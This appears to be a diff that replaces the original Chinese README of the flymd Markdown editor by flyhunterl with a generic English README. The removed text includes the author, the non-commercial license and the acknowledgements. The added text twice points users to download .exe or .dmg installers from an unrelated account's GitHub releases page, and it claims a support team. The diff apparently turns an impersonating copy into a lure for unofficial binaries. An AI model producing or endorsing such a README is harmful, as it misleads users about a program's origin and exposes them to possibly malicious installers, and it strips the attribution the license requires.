@@ -1,161 +1,78 @@
-# 飞速MarkDown（FlyMD）
+# 🌟 flymd - Effortless Markdown Editing and PDF Reading
 
-[简体中文](README.md) | [English](README.en.md)
+## 🚀 Getting Started
 
-[![Version](https://img.shields.io/badge/version-v0.2.7-blue.svg)](https://github.com/flyhunterl/flymd)
-[![License](https://img.shields.io/badge/license-NonCommercial-green.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/flyhunterl/flymd)
+Welcome to flymd! This tool helps you edit Markdown files and read PDF documents quickly. It is designed for everyone, whether you're a student, writer, or just need to manage text files. Let’s get you set up.
 
-跨平台 所见所得 图床上传 WebDav同步 插件扩展 响应迅速 占用极低的 Markdown 编辑 PDF 阅读工具。
+## 📥 Download & Install
 
+To get started, you need to download flymd. Visit the link below to access the latest version:
 
-![1](https://github.com/user-attachments/assets/38f9f007-8a09-4231-9c53-2d3bc6f245be)
+[![Download flymd](https://img.shields.io/badge/Download-flymd-blue.svg)](https://github.com/Interracial-mentum925/flymd/releases)
 
+After clicking the link, follow these steps:
 
+1. You will be taken to the Releases page.
+2. Look for the latest version. It is usually marked with the highest version number.
+3. Click on the version number to see the available files.
+4. Download the file that matches your operating system. This is often labeled with `.exe` for Windows or `.dmg` for macOS.
 
-## ✨ 项目特色
+## 💻 System Requirements
 
+To ensure smooth operation, make sure your computer meets these basic requirements:
 
-- 即开即用：安装包仅7MB 拒绝臃肿。冷启动毫秒级响应，代码一键复制
-- 界面干净：极简界面，默认仅菜单栏+编辑区，专注内容创作 启动速度和响应速度优秀
-- 文库功能：支持指定文件夹，树状目录显示文件夹下子文件夹及文档 并支持文档管理/支持添加多个文档库
-- 安全可靠：本地运行，无网络连接，预览 HTML 自动消毒 
-- 图床支持：支持S3/R2绑定，直接粘贴图片上传 上传成功后自行写好图片连接语法
-- 功能全面：MarkDown LaTeX Mermaid html全部支持
-- 即时渲染：所见模式，输入即渲染！Mermaid LaTex全局实时渲染，双击编辑代码
-- 极致性能：毫秒级响应速度，告别同类软件常见痛点
-- 位置记忆：阅读和编辑文档位置均自动记忆，下次打开改文档无论阅读还是编辑都回到记忆位置（v0.0.6正式版）
-- 自动同步：Webdav同步功能
-- 插件扩展：支持插件扩展功能，可以自行开发也可以一键安装已上架的扩展/插件
-- 格式支持：支持另存为PDF Docx Wps 
-- 人工智能：可通过扩展市场安装AI助手（通过扩展市场安装）润色、改错、总结。
-## 📸 界面预览 0.2.2版本
+- **Operating System:** Windows 10 or later, macOS 10.12 or later
+- **Memory:** At least 4 GB RAM
+- **Storage:** 100 MB of available disk space
+- **Internet Connection:** Needed for initial download and updates
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/661c3263-d877-4fcf-a77f-69096b42b9d5" width="32%" alt="Markdown Editor Screenshot 1"/>
-  <img src="https://github.com/user-attachments/assets/1182c443-f93c-4167-bc05-f4cc4b391ab5" width="32%" alt="Markdown Editor Screenshot 2"/>
-  <img src="https://github.com/user-attachments/assets/d51945f9-c227-43eb-8105-0bb07d66db52" width="32%" alt="Markdown Editor Screenshot 3"/>
-</p>
+## 📋 Features
 
+flymd includes a variety of useful features:
 
-## 核心特性
-- 编辑体验
-  - 即时编辑/所见即所得（基于 Milkdown）
-  - 原生低延迟：保留 `<textarea>` 管线，中文输入法合成友好，智能成对补全括号/引号，不干扰输入（编辑模式）
-  - 统一缩进与多行操作：`Tab` 在编辑/WYSIWYG 两种模式下表现一致
-  - 常用格式化：`Ctrl+B` 加粗、`Ctrl+I` 斜体、`Ctrl+K` 插入链接；精确的行列/光标位置反馈
-  - 所见模式使用`Ctrl+Enter`跳出代码区  
-  **编辑模式使用标准语法，空格X2+回车才会触发提行。未使用标准语法切换到所见模式提行会失效。阅读模式不受影响**  
-  **自动补全仅编辑模式生效**  
-  **因中英文符号的区别，中文输入法可能影响补全体验，建议切换到英文标点**
-- 阅读与大纲
-  - 安全预览：`markdown-it` 渲染 + `highlight.js` 代码高亮 + `DOMPurify` 清洗 HTML，外链自动追加 `target="_blank"` + `rel="noopener"`
-  - 大纲导航：提取 Markdown `H1–H6` 生成可点击目录，高亮当前标题，预览与滚动同步
-  - PDF 书签（Outline）：内置 PDF 阅读与书签大纲，按文件缓存并在修改时自动失效
-- 图片与图床
-  - 一步到位：粘贴/拖拽图片自动处理；优先上传至 S3/R2 并插入公网 URL；未配置/失败时回退本地保存
-  - 本地图片就地可见：无需额外配置即可预览
-- 同步（WebDAV 扩展）
-  - 同步可视化：状态提示、过程日志、进度反馈与冲突提示
-  - 远端移动优化：利用 `MOVE` 降低重复下载/上传，优化重命名/移动场景
-- 语言与可用性
-  - 中英双语 + 自动：跟随系统语言或手动切换，记忆用户选择
-  - 位置记忆：每个文件独立记忆上次“阅读/编辑光标/滚动位置”
-- 安全与性能
-  - 本地优先，零后台网络：除非你明确启用（图床、同步等），否则不进行网络访问
-  - 性能优化：冷启动与渲染链路按需加载、静态资源分块、日志可控；目标冷启动 <300ms、预览切换 <16ms（典型 2–3k 行文档）
-## 快速开始
-- 安装
-  - 从发布页下载对应平台安装包并安装；Windows 需安装 WebView2（多数系统已内置）
-- 创建/打开
-  - 新建：`Ctrl+N`；打开：`Ctrl+O`；保存：`Ctrl+S`；另存为：`Ctrl+Shift+S`
-  - 资料库：侧边栏文件树支持新建/重命名/移动/删除与最近文件
-- 模式切换
-  - 编辑模式：`Ctrl+E`；可以用于编辑阅读切换
-  - 快速阅读：`Ctrl+R`
-  - 所见模式：`Ctrl+W`；可以用于所见编辑切换
-- 常用编辑
-  - 加粗/斜体/链接：`Ctrl+B / Ctrl+I / Ctrl+K`；`Esc` 关闭对话框
-  - 图片：粘贴/拖入即可（所见模式不支持拖动）；配置 S3/R2 后自动上传插入 URL；未配置/失败回退本地保存。可选：总是保存到本地
-- 同步（可选）
-  - 在“扩展”里启用 WebDAV，提供 日志/进度/冲突提示；（上线不久仍然完善，记得备份）
-- 语言
-  - 设置中切换 中文/English 或选择 Auto 跟随系统；语言偏好会被记住
-## ⌨️ 快捷键
+- **WYSIWYG Editing:** See your changes as you make them without fuss.
+- **WebDAV Synchronization:** Easily sync files with cloud storage.
+- **Automatic Image Uploads:** Quickly add images to your documents.
+- **AI-Assisted Writing:** Get suggestions and improve your content.
+- **Plugin Extensibility:** Customize the tool to fit your needs.
+- **Low Resource Usage:** It runs smoothly on most computers without slowing them down.
 
-| 快捷键 | 功能 |
-|--------|------|
-| `Ctrl+N` | 新建文件 |
-| `Ctrl+O` | 打开文件 |
-| `Ctrl+S` | 保存文件 |
-| `Ctrl+H` | 查找替换 |
-| `Ctrl+Shift+S` | 另存为 |
-| `Ctrl+E` | 切换编辑/预览 |
-| `Ctrl+R` | 进入阅读（预览） |
-| `Ctrl+W` | 开/关所见模式 |
-| `Escape` | 预览或弹窗下关闭/返回 |
-| `Ctrl+B` | 加粗 |
-| `Ctrl+I` | 斜体 |
-| `Ctrl+K` | 插入链接 |
+## 🔧 Using flymd
 
-## 🔌 扩展开发
+After installing flymd, follow these steps to start using the application:
 
-flyMD 支持通过扩展插件来增强功能。你可以：
+1. Open flymd by double-clicking on its icon.
+2. Choose "New Document" or open an existing Markdown or PDF file.
+3. Use the editing features to format your text. Explore options in the toolbar.
+4. Save your work often to prevent losing any changes.
+5. To upload images, simply drag and drop them into the editor.
 
-- 开发自定义扩展插件
-- 从 GitHub 或 HTTP URL 安装插件
-- 管理已安装的扩展
+## 🌐 Support and Help
 
-详细开发指南请参阅：[扩展开发文档](plugin.md)
+If you encounter any issues or need help, check out the following resources:
 
-**示例插件：**
-- [Typecho Publisher](https://github.com/TGU-HansJack/typecho-publisher-flymd) - 将文章发布到 Typecho 博客平台
+- **FAQ:** Available on the GitHub page.
+- **Issues Section:** Report any problems you face; our team will assist you.
+- **Community Forum:** Connect with other users to share tips and advice.
 
+## 🎓 Learning Markdown
 
-## 📊 性能指标（目标）
+If you’re new to Markdown, don't worry! It’s easy to learn. Here are some basic commands:
 
-- 冷启动：≤ 300ms
-- 安装包体积：≤ 10MB
-- 常驻内存：≤ 50MB
-- 预览切换：≤ 16ms
+- **Bold:** `**text**` will show up as **text**.
+- **Italic:** `*text*` will show up as *text*.
+- **Headers:** Use `#` for header levels. More `#` means a smaller header.
 
-## 路线图[更新记录]
+Explore more online to discover all the possibilities Markdown offers.
 
-详见: [ROADMAP.md](ROADMAP.md)
+## 👍 Contributing
 
-### 跨平台支持
-- [x] Windows 10/11
-- [x] Linux（桌面环境）
-- [x] MacOS 
+If you want to help improve flymd, we welcome contributions! Check the “Contributing” guidelines on our GitHub repository for details on how to get involved.
 
+## 🔗 Final Download Reminder
 
-## 🤝 贡献指南
+Ready to dive in? Don’t forget to download flymd from the link below:
 
-欢迎提交 Issue 和 Pull Request！
+[![Download flymd](https://img.shields.io/badge/Download-flymd-blue.svg)](https://github.com/Interracial-mentum925/flymd/releases)
 
-## 📄 许可与合规
-
-- 本项目采用“飞速MarkDown（flyMD）非商业开源许可协议（NC 1.0）”。
-- 允许：在非商业前提下自由使用、修改、复制与再分发；必须保留署名与来源。
-- 商业使用：未经书面授权禁止。商业授权请联系：flyhunterl <flyhunterl@gmail.com>。
-- 许可全文见：[LICENSE](LICENSE)（附英文翻译，中文为主版本）
-- 第三方组件许可见：[THIRD-PARTY-NOTICES.md](THIRD-PARTY-NOTICES.md)
-
-## 🙏 致谢
-- [MilkDown](https://milkdown.dev/)
-- [Tauri](https://tauri.app/)
-- [markdown-it](https://github.com/markdown-it/markdown-it)
-- [DOMPurify](https://github.com/cure53/DOMPurify)
-- [highlight.js](https://highlightjs.org/)
-- [KaTeX](https://katex.org/)
-- [Mermaid](https://mermaid.js.org/)
-
-## 常见问题 (Linux)
-
-- [Arch 遇到程序打开空白的解决方法](arch.md)
-
-
-## 开源不易
-
-<img width="300" height="300" alt="image" src="https://github.com/user-attachments/assets/4a716fd5-dc61-4a4f-b968-91626debe8d2" />
-
+Enjoy editing your documents with flymd!
